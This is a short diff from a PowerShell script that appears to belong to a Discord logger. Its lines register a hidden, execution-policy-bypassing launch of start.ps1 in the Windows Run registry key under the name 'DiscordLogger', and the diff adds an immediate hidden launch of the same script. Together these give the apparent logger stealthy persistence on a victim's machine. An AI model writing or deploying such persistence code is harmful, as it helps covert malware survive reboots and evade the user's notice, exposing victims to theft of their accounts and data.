@@ -9,3 +9,4 @@ $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
 Set-ItemProperty -Path $regPath -Name "DiscordLogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath\start.ps1`""
 
+Start-Process "powershell.exe -window hidden -ep bypass .\start.ps1"
